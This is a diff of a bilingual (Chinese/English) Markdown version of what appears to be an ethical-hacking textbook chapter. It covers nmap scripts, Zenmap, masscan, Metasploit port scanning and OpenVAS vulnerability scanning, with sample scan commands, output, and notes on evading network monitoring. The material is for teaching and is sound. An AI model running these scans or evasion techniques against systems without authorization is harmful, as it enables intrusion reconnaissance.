 |   IP: fe80::a483:e7ff:fe9c:6f65  MAC: a6:83:e7:9c:6f:65  IFACE: ens33
+
 |_  Use --script-args=newtargets to add the results as targets
+
 | targets-ipv6-multicast-invalid-dst: 
+
 |   IP: fe80::a483:e7ff:fe9c:6f65  MAC: a6:83:e7:9c:6f:65  IFACE: ens33
+
 |_  Use --script-args=newtargets to add the results as targets
 ```
 
 要使用脚本，需要通过 `--script=` 参数后跟脚本名称来指定。除了直接使用脚本名，还可以指定类别，如上例所示。在 Linux 系统上，已安装的脚本通常位于 `/usr/share/nmap/scripts`；在 Windows 系统上，则位于 `nmap` 安装目录的 Program Files 文件夹中。你会发现这些脚本的文件扩展名为 `.nse`，属于 "`nmap` scripting engine"。脚本使用 Lua 语言编写，每个文件都可以打开并阅读，以便了解脚本的功能。如果你更倾向让 `nmap` 提供脚本信息，可以使用 `--script-help` 并传入脚本名称。例如，想获取 `http-waf-detect.nse` 的详细信息，可这样调用 `nmap` 并看到响应的开头：
 
-**Nmap Script Help**
+### `nmap` Script Help
 
 ```
 $ nmap --script-help=http-waf-detect.nse
+
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-15 17:51 EST
   
 http-waf-detect
+
 Categories: discovery intrusive
+
 https://nmap.org/nsedoc/scripts/http-waf-detect.html
+
    Attempts to determine whether a web server is protected by an IPS (Intrusion
+
    Prevention System), IDS (Intrusion Detection System) or WAF (Web Application
+
    Firewall) by probing the web server with malicious payloads and detecting
+
    changes in the response code and body.
+
   
+
    To do this the script will send a "good" request and record the response,
+
    afterwards it will match this response against new requests containing
+
    malicious payloads. In theory, web applications shouldn't react to malicious
+
    requests because we are storing the payloads in a variable that is not used by
+
    the script/file and only WAF/IDS/IPS should react to it.  If aggro mode is set,
+
    the script will try all attack vectors (More noisy)
+
   
+
    This script can detect numerous IDS, IPS, and WAF products since they often
+
    protect web applications in the same way.  But it won't detect products which
+
    don't alter the http traffic.  Results can vary based on product configuration,
+
    but this script has been tested to work against various configurations of the
+
    following products:
+
   
+
    * Apache ModSecurity
+
    * Barracuda Web Application Firewall
+
    * PHPIDS
+
    * dotDefender
+
    * Imperva Web Application Firewall
+
    * Blue Coat SG 400
  
 ```
 
 另一种获取此信息的方式是直接查看脚本本身。编写 `nmap` 脚本时会设置多个变量，其中之一是 `description`，它在调用 `script-help` 时会被打印出来。此外，你还会看到使用说明，指示如何在 `nmap` 中调用该脚本，以及顶部的 `require` 语句，这些语句用于引入脚本引擎提供的功能模块。这些模块是脚本被 `nmap` 调用所必需的。
 
-**Top of the `http-waf-detect.nse` File**
-
-
+### Top of the `http-waf-detect.nse` File
 
 ```lua
 local http = require "http"
@@ -4168,7 +4553,9 @@ local stdnse = require "stdnse"
 local string = require "string"
 local table = require "table"
 ```
+
 description = [[
+
 尝试通过发送恶意负载并检测响应代码和内容的变化，判断目标 Web 服务器是否受 IPS（入侵防御系统）、IDS（入侵检测系统）或 WAF（Web 应用防火墙）保护。
 
 为此，脚本会先发送一次“正常”请求并记录响应，随后将该响应与包含恶意负载的新请求进行匹配。理论上，Web 应用不应响应恶意请求，因为我们将负载存储在未被脚本使用的变量中，只有 WAF/IDS/IPS 应该对此作出反应。如果启用了“aggro”模式，脚本会尝试所有攻击向量（更吵闹）。
@@ -4176,29 +4563,47 @@ description = [[
 本脚本能够检测众多 IDS、IPS 和 WAF 产品，因为它们通常以相同方式保护 Web 应用。但无法检测那些不修改 HTTP 流量的产品。结果会因产品配置而异，但本脚本已在以下产品的多种配置上测试通过：
 
 * `Apache ModSecurity`
+
 * `Barracuda Web Application Firewall`
+
 * `PHPIDS`
+
 * `dotDefender`
+
 * `Imperva Web Application Firewall`
+
 * `Blue Coat SG 400`
+
 ]]
- 
+
 ---
+
 -- @usage
+
 -- nmap -p80 --script http-waf-detect <host>
+
 -- nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.uri=/testphp.vulnweb.com/artists.php" www.modsecurity.org
+
 --
+
 -- @output
+
 -- PORT   STATE SERVICE
+
 -- 80/tcp open  http
+```
+
+
+
+```
 -- |_http-waf-detect: IDS/IPS/WAF detected
 --
 -- @args http-waf-detect.uri Target URI. Use a path that does not redirect to a different page
 -- @args http-waf-detect.aggro If aggro mode is set, the script will try all attack vectors to trigger the IDS/IPS/WAF
 -- @args http-waf-detect.detectBodyChanges If set it also checks for changes in the document's body
- 
 ```
-Nmap Using Wildcards
+
+## Nmap Using Wildcards
 
 You can call individual scripts, or let `nmap` select multiple scripts using wildcards. For example, to run all scripts related to the Server Message Block (SMB) protocol version 2, specify `smb2*`. All scripts whose names start with `smb2` will be executed. If the SMB ports are open, three scripts will run. You can see the command and results in the following code listing. The port scan identified port 445 as open, which is the port used for the Common Internet File System (CIFS), an implementation of SMBv2. This port triggered the script execution; when `nmap` found the port open, it identified all scripts registered for that port and ran them.
 
@@ -4206,7 +4611,8 @@ You can call individual scripts, or let `nmap` select multiple scripts using wil
 
 ```
 $ sudo nmap -sS --script "smb2*" -T 4 192.168.86.32
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-15 17:54 EST 
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-15 17:54 EST
 Nmap scan report for billthecat.lan (192.168.86.32)
 Host is up (0.00024s latency).
 Not shown: 500 closed ports, 495 filtered ports
@@ -4217,7 +4623,6 @@ PORT     STATE SERVICE
 548/tcp  open  afp
 5900/tcp open  vnc
 MAC Address: AC:87:A3:36:D6:AA (Apple)
- 
 Host script results:
 | smb2-capabilities:
 |   2.10:
@@ -4235,16 +4640,16 @@ Host script results:
 |   2.10:
 |_    Message signing enabled and required
 |_smb2-time: Protocol negotiation failed (SMB2)
- 
 Nmap done: 1 IP address (1 host up) scanned in 3.44 seconds
 ```
+
 As you can see, `nmap` scripts can collect a lot of information about different services. As of this writing, there are more than 600 scripts. More than 30 of them are specifically targeted at identifying whether a server is potentially exposed to a vulnerability identified by a Common Vulnerabilities and Exposures (CVE) identifier. Other scripts identify systems vulnerable to other exposures. For example, there is a script that looks for the Decrypting RSA with Obsolete and Weakened eNcryption (DROWN) vulnerability in servers running Secure Sockets Layer (SSL) version 2. This was a serious vulnerability, identifiable by interacting with the system using SSL.
 
 If you have programming experience, extending `nmap` with your own scripts is straightforward. All NSE scripts are plain text, so you can use any of them as a starting point or as code samples to create your own script. Keep in mind that while `nmap` is a port scanner, the scripting engine enables deeper interactions with applications. Scripts can make programmatic determinations based on service responses. The scripting engine modules not only provide functionality to interact with services, including registering ports with `nmap` so the script runs when the identified port is open, but also include output modules that present results back to `nmap` when the script completes.
 
-#### Zenmap
+### Zenmap
 
-You can use the command line for all `nmap` scans, but you don't have to if you prefer a GUI. For years, only the command line was available. Attempts to create GUIs overlaying `nmap` existed, and Google Summer of Code produced Zenmap, a GUI that has remained the front‑end for `nmap` for years. Zenmap is an overlay; it runs `nmap` underneath and displays the results in a graphical interface. With Zenmap, you don't need to think about the specific scan type; you select a scan name from a pull‑down menu (see Figure 5.3).
+You can use the command line for all `nmap` scans, but you don't have to if you prefer a GUI. For years, only the command line was available. Attempts to create GUIs overlaying `nmap` existed, and Google Summer of Code produced Zenmap, a GUI that has remained the front-end for `nmap` for years. Zenmap is an overlay; it runs `nmap` underneath and displays the results in a graphical interface. With Zenmap, you don't need to think about the specific scan type; you select a scan name from a pull-down menu (see Figure 5.3).
 
 ![FIGURE 5.3 Zenmap scan types](img/c05f003.png)
 
@@ -4253,8 +4658,6 @@ You can use the command line for all `nmap` scans, but you don't have to if you 
 You will also see a command box. Selecting different scan types changes the command line. Instead of options like SYN scan or full connect scan, you can choose intense scan, quick scan, regular scan, and others. Intense scans set a high throttle to complete the scan faster. Regular scans keep the default throttle. A slow comprehensive scan also increases the throttle. If none of the provided scan types suit you, you can edit the command line directly and run any custom command.
 
 The advantage of Zenmap is not just the ability to select predefined scan settings, but also visualizing the output. The command line produces extensive text that you must parse; Zenmap organizes the results, showing hosts on the left side and a small icon indicating the detected operating system. You also get the regular `nmap` output if you prefer to view it directly. Zenmap can make it easier to interpret the results.
-
-
 
 Figure 5.4 显示了可视化输出的另一种方式。再次，进行端口扫描的重要方面之一是识别服务，随后识别应用。在 Figure 5.4 的左侧，点击 **Services** 按钮会显示扫描中识别出的所有服务列表。选择其中一个服务，会显示在扫描期间正在运行该服务的所有主机。如果查看 Figure 5.4 的右侧，你会看到主机列表，同时在某些情况下还能看到该主机上运行的应用及其版本。
 
@@ -4266,16 +4669,17 @@ Zenmap 另一个有用的功能是保存扫描。OK，它不仅仅是保存扫�
 
 虽然我一般更倾向于使用命令行，但有时 GUI 工具会更有用。我更喜欢从命令行运行扫描，但 Zenmap 的可视化和组织能力让我觉得值得使用。当然，Zenmap 不要求你在 Zenmap 中进行初始扫描。你可以在 `nmap` 中运行扫描，将输出保存为 XML 格式，然后在 Zenmap 中打开 XML 文件，获取我们在此讨论的所有好处。
 
-### *masscan*
+### `masscan`
 
 你是否曾想过只扫描整个互联网，以识别所有响应的 Web 服务器？显然，如果要做这件事，你会希望以最高速度进行，尽可能快。根据 `masscan` 的开发者 Robert Graham 的说法，这正是 `masscan` 的初衷。其核心是一个端口扫描工具，它执行 `nmap` 的许多相同操作。不同之处在于它被设计用来尽可能快地运行，受限于你的系统和网络连接的速度。
 
-由于 `nmap` 已成为事实上的端口扫描工具，而熟悉端口扫描的人知道 `nmap` 的用法，`masscan` 使用与 `nmap` 相同的命令行参数。端口扫描本身并不复杂，关键是告诉扫描器要扫描哪些端口以及扫描哪些系统。下面的代码展示了使用 `masscan` 识别所有 Web 服务器的过程。与 `nmap` 相比，你会发现指示端口的参数相同。你还会注意到，我把扫描类型留空，`masscan` 为我填入了 `‑sS`。
+由于 `nmap` 已成为事实上的端口扫描工具，而熟悉端口扫描的人知道 `nmap` 的用法，`masscan` 使用与 `nmap` 相同的命令行参数。端口扫描本身并不复杂，关键是告诉扫描器要扫描哪些端口以及扫描哪些系统。下面的代码展示了使用 `masscan` 识别所有 Web 服务器的过程。与 `nmap` 相比，你会发现指示端口的参数相同。你还会注意到，我把扫描类型留空，`masscan` 为我填入了 `-sS`。
 
-**masscan 识别 Web 服务器**
+**`masscan` 识别 Web 服务器**
 
 ```
 $ sudo masscan --rate=100000 -p80,443 192.168.86.0/24
+
 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-11-15 22:55:40 GMT
 Initiating SYN Stealth Scan
 Scanning 256 hosts [2 ports/host]
@@ -4291,14 +4695,15 @@ Discovered open port 80/tcp on 192.168.86.44
 
 最显著的区别在于 `rate` 参数的加入。该参数以每秒包数为单位，可使用小数形式（如 0.5）表示每 2 秒发送一个包。这里请求的速率为每秒 100,000 包。实际效果会因目标、可用带宽以及系统和网络接口的发送能力而异。
 
-你可能还注意到 `masscan` 强制使用 `‑‑randomize‑hosts`，这意味着测试的 IP 地址顺序不会是数值顺序，而是随机排列。随机化主机顺序的目的在于绕过网络监控工具。如果按顺序扫描，监控工具很容易识别出扫描正在进行。随机化扫描使情况不那么明显。如果同时降低速率，这种效果会更明显。
+你可能还注意到 `masscan` 强制使用 `--randomize-hosts`，这意味着测试的 IP 地址顺序不会是数值顺序，而是随机排列。随机化主机顺序的目的在于绕过网络监控工具。如果按顺序扫描，监控工具很容易识别出扫描正在进行。随机化扫描使情况不那么明显。如果同时降低速率，这种效果会更明显。
 
-`masscan` 不仅仅做端口扫描，它还能进行非常快速的扫描，甚至进行类似 `nmap` 的信息收集。你可以使用 `‑‑banners` 参数让 `masscan` 捕获服务标题。具体做法如下：
+`masscan` 不仅仅做端口扫描，它还能进行非常快速的扫描，甚至进行类似 `nmap` 的信息收集。你可以使用 `--banners` 参数让 `masscan` 捕获服务标题。具体做法如下：
 
-**使用 masscan 获取标题**
+**使用 `masscan` 获取标题**
 
 ```
 $ sudo masscan -sS --banners --rate=100000 -p80,443 192.168.86.0/24
+
 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-11-15 23:01:13 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
@@ -4313,8 +4718,10 @@ Discovered open port 443/tcp on 192.168.86.245
 Discovered open port 80/tcp on 192.168.86.196
 Discovered open port 80/tcp on 192.168.86.247
 Banner on port 80/tcp on 192.168.86.35: [http] HTTP/1.1 200 OK\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html\x0d\x0aCache-Control: no-cache\x0d\x0aExpires: -1\x0d\x0a\x0d
-Banner on port 80/tcp on 192.168.86.35: [title] Redirect to Login 
+Banner on port 80/tcp on 192.168.86.35: [title] Redirect to Login
 ```
+
+
 
 你会发现只有其中一个系统显示了标题，且标题中没有服务器类型。相同的服务器暗示可能会跳转到登录页面。使用 `nmap` 运行相同的扫描会返回服务器类型。`masscan` 不具备 `nmap` 的全部功能，包括不支持诸如 Xmas、FIN、ACK 等非标准 TCP 扫描类型，也不支持 UDP 扫描。如果需要这些功能，可以使用 `nmap`，它是免费的且足以应付这类扫描。`masscan` 为你提供的是自定义扫描速率的能力以及进行极快扫描的能力。
 
@@ -4325,9 +4732,6 @@ Banner on port 80/tcp on 192.168.86.35: [title] Redirect to Login
 ![FIGURE 5.5 MegaPing scan types](img/c05f005.png)
 
 **FIGURE 5.5** MegaPing scan types
-
-
-
 
 要在 MegaPing 中运行扫描，你需要在界面左侧选择 `Port Scanner`。然后需要添加你的扫描目标。MegaPing 的一个缺点是它不接受 CIDR 块作为目标，也不接受地址范围。如果你想扫描多个 IP 地址，需要逐个添加。你会在中间的框中看到可以添加地址的区域，然后选择要扫描的地址。如果只想扫描一个地址，只需在 `Destination Address List` 下方的框中输入该地址，然后点击 `Start`。Figure 5.6 展示了对恶意端口进行扫描的结果。
 
@@ -4343,20 +4747,31 @@ Metasploit 主要以 exploit 框架闻名，你会在想要开始利用服务、
 
 ```
 msf>> search portscan
- 
+
 Matching Modules
+
 ================
- 
+
    #  Name                                              Disclosure Date  Rank    Check  Description
+
    -  ----                                              ---------------  ----    -----  -----------
+
    0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
+
    1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
+
    2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
+
    3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
+
    4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
+
    5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
+
    6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
+
    7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
+
 ```
 
 可以看出，我们可以使用与 `nmap` 类似的技术。`nmap` 使用命令行开关，即使在 Zenmap 中也是如此；而 Metasploit 则更具交互性。你需要设置参数或变量，为正在使用的模块提供扫描目标网络所需的信息。以下是使用 `msfconsole` 进行扫描时的输出：
@@ -4369,33 +4784,51 @@ Matching Modules
 
     ```
     msf>> use scanner/portscan/syn
+
     msf auxiliary(scanner/portscan/syn)>> set RHOSTS 192.168.1.0/24
+
     RHOSTS => 192.168.1.0/24
+
     msf auxiliary(scanner/portscan/syn)>> show options
-     
+
     Module options (auxiliary/scanner/portscan/syn):
-     
+
        Name       Current Setting  Required  Description
+
        ----       ---------------  --------  -----------
+
        BATCHSIZE  256              yes       The number of hosts to scan per set
+
        DELAY      0                yes       The delay between connections, per thread,
+
                                              in milliseconds
+
        INTERFACE                   no        The name of the interface
+
        JITTER     0                yes       The delay jitter factor (maximum value
+
                                              by which to +/- DELAY) in milliseconds.
-    
+
        PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+
        RHOSTS     192.168.1.0/24   yes       The target host(s), see https://githu
+
                                              b.com/rapid7/metasploit-framework/wiki/
+
                                              Using-Metasploit
+
        SNAPLEN    65535            yes       The number of bytes to capture
+
        THREADS    1                yes       The number of concurrent threads (max
+
                                               one per host)
+
        TIMEOUT    500              yes       The reply read timeout in milliseconds
-                                             
-     
+
     msf auxiliary(scanner/portscan/syn)>> set INTERFACE ens33
+
     INTERFACE => ens33
+
     msf auxiliary(scanner/portscan/syn)>> run
     ```
 
@@ -4405,19 +4838,32 @@ Matching Modules
 
     ```
     msf auxiliary(scanner/portscan/syn)>> run
-     
+
     [+] TCP OPEN 192.168.4.10:22
+
     [+] TCP OPEN 192.168.4.15:22
+
     [+] TCP OPEN 192.168.4.20:22
+
     [+] TCP OPEN 192.168.4.99:22
+
     [+] TCP OPEN 192.168.4.101:22
+
     [+] TCP OPEN 192.168.4.136:22
+
     [+] TCP OPEN 192.168.4.183:22
+
     [+] TCP OPEN 192.168.4.1:53
+
     [+] TCP OPEN 192.168.4.178:53
+
     [+] TCP OPEN 192.168.4.196:53
+
     [+] TCP OPEN 192.168.4.202:53
     ```
+
+
+
 
 运行 Metasploit 中的端口扫描的一个优势是它会将结果保存在数据库中，后续可以直接调用，无需每次重新执行扫描。
 
@@ -4425,51 +4871,45 @@ Matching Modules
 
 ### 漏洞扫描
 
+- `[open ports]` 和甚至是 `[applications]` 在这些端口上正在监听，这只是一个好的开始。你可以在对这些应用程序中可能存在的漏洞进行大量研究后，开始在 `open ports` 处盲目尝试和摸索。你也可以直接找到大量 `exploits` 并将其抛向在 `open ports` 上的应用程序。这可能是一种简单的方法，用来检查是否存在漏洞。你只需将你能找到的所有 `exploits` 与目标进行比对。这种做法有几个问题。第一个问题是，你可能会导致目标系统出现故障，而你并不想要这样。盲目测试可能会产生意外结果，而从伦理角度来说，你的目标之一是不造成伤害。
 
+- 当然，任何类型的安全测试都可能导致意外结果和失败。然而，你的工作是尽可能地控制它，并确保你的客户或雇主了解你的测试可能带来的后果。你不应该向客户说明你只是随意向他们的系统抛出大量 `exploits`，而对其影响缺乏了解，导致他们可能出现宕机。你的工作是控制测试——要了解自己在做什么以及可能的结果。
 
+- 另一个问题是，如果你正在进行红队测试，目标系统对你的攻击毫不知情，你需要确保他们不会检测到你，或者至少要尽一切努力避免被发现。盲目对大量系统（包括那些可能根本没有受影响的应用程序）进行大量 `exploits` 的做法会产生噪音，一旦有检测能力就会被发现，这意味着你失败了。
 
--   [open ports] 和甚至是 [applications] 在这些端口上正在监听，这只是一个好的开始。你可以在对这些应用程序中可能存在的漏洞进行大量研究后，开始在 `open ports` 处盲目尝试和摸索。你也可以直接找到大量 `exploits` 并将其抛向在 `open ports` 上的应用程序。这可能是一种简单的方法，用来检查是否存在漏洞。你只需将你能找到的所有 `exploits` 与目标进行比对。这种做法有几个问题。第一个问题是，你可能会导致目标系统出现故障，而你并不想要这样。盲目测试可能会产生意外结果，而从伦理角度来说，你的目标之一是不造成伤害。
+- 更好的做法是使用 `vulnerability scanner`，它采用智能的方式识别潜在漏洞。`vulnerability scanner` 会识别 `open ports` 和监听的 `applications`，然后根据这些 `applications` 判断可能的漏洞。随后，它会运行为这些漏洞预定义的测试。扫描器的目标不是 compromising 系统，而是仅仅识别潜在漏洞。
 
--   当然，任何类型的安全测试都可能导致意外结果和失败。然而，你的工作是尽可能地控制它，并确保你的客户或雇主了解你的测试可能带来的后果。你不应该向客户说明你只是随意向他们的系统抛出大量 `exploits`，而对其影响缺乏了解，导致他们可能出现宕机。你的工作是控制测试——要了解自己在做什么以及可能的结果。
+- 这并不保证扫描器识别出的就是可利用的漏洞。它意味着扫描器根据与目标系统的交互以及扫描器拥有的数据，认为某个点可能是漏洞。这被称为 `false positive`。任何扫描器发现的问题都需要手动验证。这可能包括检查扫描器呈现的实际交互——有时仅凭返回码而未查看实际数据，例如。也可能需要重新执行扫描器执行的测试。漏洞扫描器是工具，不应被视为测试的终点，而是起点。尽管扫描器功能强大，但它们并非最终。
 
--   另一个问题是，如果你正在进行红队测试，目标系统对你的攻击毫不知情，你需要确保他们不会检测到你，或者至少要尽一切努力避免被发现。盲目对大量系统（包括那些可能根本没有受影响的应用程序）进行大量 `exploits` 的做法会产生噪音，一旦有检测能力就会被发现，这意味着你失败了。
-
--   更好的做法是使用 `vulnerability scanner`，它采用智能的方式识别潜在漏洞。`vulnerability scanner` 会识别 `open ports` 和监听的 `applications`，然后根据这些 `applications` 判断可能的漏洞。随后，它会运行为这些漏洞预定义的测试。扫描器的目标不是 compromising 系统，而是仅仅识别潜在漏洞。
-
--   这并不保证扫描器识别出的就是可利用的漏洞。它意味着扫描器根据与目标系统的交互以及扫描器拥有的数据，认为某个点可能是漏洞。这被称为 `*false positive*`。任何扫描器发现的问题都需要手动验证。这可能包括检查扫描器呈现的实际交互——有时仅凭返回码而未查看实际数据，例如。也可能需要重新执行扫描器执行的测试。漏洞扫描器是工具，不应被视为测试的终点，而是起点。尽管扫描器功能强大，但它们并非最终。
-
--   从历史角度看，网络漏洞扫描器自 1990 年代初期就存在。第一个由 Dan Farmer 和 Wietse Venema 开发的工具是 Security Analysis Tool for Auditing Networks (SATAN)。SATAN 后来衍生出 Security Auditors Research Assistant (SARA) 和 Security Administrator's Integrated Network Tool (SAINT)。SATAN 主要使用 Perl 编写，并提供 Web 界面。虽然现代漏洞扫描器主要使用其他语言，但它们通常也使用 Web 界面。其中一个非常流行的扫描器是 Nessus。我们稍后会看 Nessus，但先从与 Nessus 相关的 OpenVAS 开始。
+- 从历史角度看，网络漏洞扫描器自 1990 年代初期就存在。第一个由 Dan Farmer 和 Wietse Venema 开发的工具是 Security Analysis Tool for Auditing Networks (SATAN)。SATAN 后来衍生出 Security Auditors Research Assistant (SARA) 和 Security Administrator's Integrated Network Tool (SAINT)。SATAN 主要使用 Perl 编写，并提供 Web 界面。虽然现代漏洞扫描器主要使用其他语言，但它们通常也使用 Web 界面。其中一个非常流行的扫描器是 Nessus。我们稍后会看 Nessus，但先从与 Nessus 相关的 OpenVAS 开始。
 
 ### OpenVAS
 
--   SATAN 是开源的，意味着你可以查看 SATAN 的所有实现，并且如果你愿意，可以自行添加模块来扩展其功能。即使你找到 SATAN 的副本，也能查看其源代码。
+- SATAN 是开源的，意味着你可以查看 SATAN 的所有实现，并且如果你愿意，可以自行添加模块来扩展其功能。即使你找到 SATAN 的副本，也能查看其源代码。
 
--   2000 年代初期，另一个开源漏洞扫描器是 Nessus。它最初于 1998 年以免费漏洞扫描器的形式发布，并在 2005 年（公司在三年前成立）关闭源代码，使后续开发全部专有。当时，已有的 Nessus 源码是第 2 版，Tenable 的第一个版本是第 3 版。第 2 版的源码是开放的，于是两个独立项目相继创建，其中一个是将 Nessus 第 2 版源码（由 Nessus 开发者放弃）fork 为新项目的基础。
+- 2000 年代初期，另一个开源漏洞扫描器是 Nessus。它最初于 1998 年以免费漏洞扫描器的形式发布，并在 2005 年（公司在三年前成立）关闭源代码，使后续开发全部专有。当时，已有的 Nessus 源码是第 2 版，Tenable 的第一个版本是第 3 版。第 2 版的源码是开放的，于是两个独立项目相继创建，其中一个是将 Nessus 第 2 版源码（由 Nessus 开发者放弃）fork 为新项目的基础。
 
--   其中一个 fork 产生了 Open Vulnerability Assessment System (OpenVAS)。最初，OpenVAS 与 Nessus 完全相同，正如你所期待的。随着时间的推移，OpenVAS 发展出自己的应用架构，采用了 Nessus 未明确使用的多层结构。Nessus 最初拥有本地客户端用于管理扫描，而 OpenVAS 继续使用相同的本地客户端。OpenVAS 通过 Greenbone Security Assistant (GSA) 作为用户界面。今天，GSA 通过 Web 界面访问。你可以在 Figure 5.7 中看到 GSA 的登录界面。
+- 其中一个 fork 产生了 Open Vulnerability Assessment System (OpenVAS)。最初，OpenVAS 与 Nessus 完全相同，正如你所期待的。随着时间的推移，OpenVAS 发展出自己的应用架构，采用了 Nessus 未明确使用的多层结构。Nessus 最初拥有本地客户端用于管理扫描，而 OpenVAS 继续使用相同的本地客户端。OpenVAS 通过 Greenbone Security Assistant (GSA) 作为用户界面。今天，GSA 通过 Web 界面访问。你可以在 Figure 5.7 中看到 GSA 的登录界面。
 
 ![FIGURE 5.7 Greenbone Security Assistant](img/c05f007.png)
 
 **FIGURE 5.7** Greenbone Security Assistant
 
--   OpenVAS 允许你拥有多个用户，每个用户可能拥有不同的权限。有些用户可以创建扫描，而有些用户只能查看扫描结果。还有用户可以创建用户并管理 OpenVAS 安装。除了用户，OpenVAS 支持角色。角色内的权限可以修改，甚至可以新建角色。安装 OpenVAS 时，管理员用户会在设置过程中自动创建，并生成一个随机密码。
+- OpenVAS 允许你拥有多个用户，每个用户可能拥有不同的权限。有些用户可以创建扫描，而有些用户只能查看扫描结果。还有用户可以创建用户并管理 OpenVAS 安装。除了用户，OpenVAS 支持角色。角色内的权限可以修改，甚至可以新建角色。安装 OpenVAS 时，管理员用户会在设置过程中自动创建，并生成一个随机密码。
 
 #### 在 OpenVAS 中设置目标
 
--   在 OpenVAS 中，一次扫描包含许多组件。创建扫描时，需要指定目标或目标集合。创建目标也需要一些信息。你需要提供想要测试的 IP 地址集合。你也可以排除某些地址。为了说明，你可能会在目标列表中提供一个网络段，但该段内可能包含脆弱系统，因此你可能希望告诉 OpenVAS 不对该地址进行测试。Figure 5.8 展示了在 OpenVAS 中创建目标的对话框，里面显示了 IP 地址以及排除项。
+- 在 OpenVAS 中，一次扫描包含许多组件。创建扫描时，需要指定目标或目标集合。创建目标也需要一些信息。你需要提供想要测试的 IP 地址集合。你也可以排除某些地址。为了说明，你可能会在目标列表中提供一个网络段，但该段内可能包含脆弱系统，因此你可能希望告诉 OpenVAS 不对该地址进行测试。Figure 5.8 展示了在 OpenVAS 中创建目标的对话框，里面显示了 IP 地址以及排除项。
 
 ![FIGURE 5.8 Creating a target in OpenVAS](img/c05f008.png)
 
 **FIGURE 5.8** Creating a target in OpenVAS
 
--   你还可以定义要扫描的端口范围。漏洞扫描器如 OpenVAS 会扫描端口以确定应集中测试的端口。你可以指定要测试的端口范围，这有助于限制测试范围，特别是当你只关注特定服务时。这是控制 OpenVAS 作业范围的一种方式。
+- 你还可以定义要扫描的端口范围。漏洞扫描器如 OpenVAS 会扫描端口以确定应集中测试的端口。你可以指定要测试的端口范围，这有助于限制测试范围，特别是当你只关注特定服务时。这是控制 OpenVAS 作业范围的一种方式。
 
--   你不总是进行黑盒测试，即不总是没有任何目标信息。有时你会拥有目标的详细信息，这些信息能帮助你更深入地了解目标组织面临的漏洞。例如，你可能会被提供凭据，这些凭据可以让 OpenVAS 通过本地凭据登录系统，从而查找本地漏洞而非仅限网络或远程漏洞。凭据在 OpenVAS 中使用后，会用于登录系统。一旦认证成功，扫描器即可开始查找本地漏洞。
+- 你不总是进行黑盒测试，即不总是没有任何目标信息。有时你会拥有目标的详细信息，这些信息能帮助你更深入地了解目标组织面临的漏洞。例如，你可能会被提供凭据，这些凭据可以让 OpenVAS 通过本地凭据登录系统，从而查找本地漏洞而非仅限网络或远程漏洞。凭据在 OpenVAS 中使用后，会用于登录系统。一旦认证成功，扫描器即可开始查找本地漏洞。
 
-
-
-
--   从目标窗口创建凭据的同时，也可以在配置菜单中创建凭据。当您指定要创建凭据时，无论是在目标创建窗口中，还是在配置菜单的凭据选项中，都会出现如下图所示的窗口（[Figure 5.9）。您可以创建适用于多种协议、使用不同认证方案的凭据。这可能仅是用户名和密码，也可能是使用 SSH 密钥替代密码。凭据创建完成后，它们可以应用于目标。您还可以指定特权提升过程。这是一套独立的凭据。这是一种您无法直接登录的用户账户，但在您登录后可以提升权限。
+- 从目标窗口创建凭据的同时，也可以在配置菜单中创建凭据。当您指定要创建凭据时，无论是在目标创建窗口中，还是在配置菜单的凭据选项中，都会出现如下图所示的窗口（[Figure 5.9）。您可以创建适用于多种协议、使用不同认证方案的凭据。这可能仅是用户名和密码，也可能是使用 SSH 密钥替代密码。凭据创建完成后，它们可以应用于目标。您还可以指定特权提升过程。这是一套独立的凭据。这是一种您无法直接登录的用户账户，但在您登录后可以提升权限。
 
 ![FIGURE 5.9 Creating credentials in OpenVAS](img/c05f009.png)
 
@@ -4479,13 +4919,13 @@ Matching Modules
 
 #### OpenVAS 中的扫描配置
 
-扫描的核心在于扫描配置。扫描配置定义了针对目标测试哪些插件（NVT）。默认情况下，OpenVAS 定义了八个扫描配置。您可以在 `Figure 5.10` 中查看这些扫描配置的列表，以及本系统中创建的一个扫描配置。您可以看到每个配置中已启用的网络漏洞测试（NVT）数量。NVT 按家庭分类以便组织。您可以启用整个家庭，或仅启用单个 NVT。您会发现有一个名为 “Empty” 的配置，其中未启用任何 NVT。创建一个仅包含少量 NVT 的新配置，会得到类似 “MyScan” 配置的结果，它仅启用了三个 NVT 和两个家庭。
+扫描的核心在于扫描配置。扫描配置定义了针对目标测试哪些插件（NVT）。默认情况下，OpenVAS 定义了八个扫描配置。您可以在 `Figure 5.10` 中查看这些扫描配置的列表，以及本系统中创建的一个扫描配置。您可以看到每个配置中已启用的网络漏洞测试（NVT）数量。NVT 按家庭分类以便组织。您可以启用整个家庭，或仅启用单个 NVT。您会发现有一个名为 `Empty` 的配置，其中未启用任何 NVT。创建一个仅包含少量 NVT 的新配置，会得到类似 `MyScan` 配置的结果，它仅启用了三个 NVT 和两个家庭。
 
 ![FIGURE 5.10 OpenVAS 扫描配置](img/c05f010.png)
 
 **FIGURE 5.10** OpenVAS 扫描配置
 
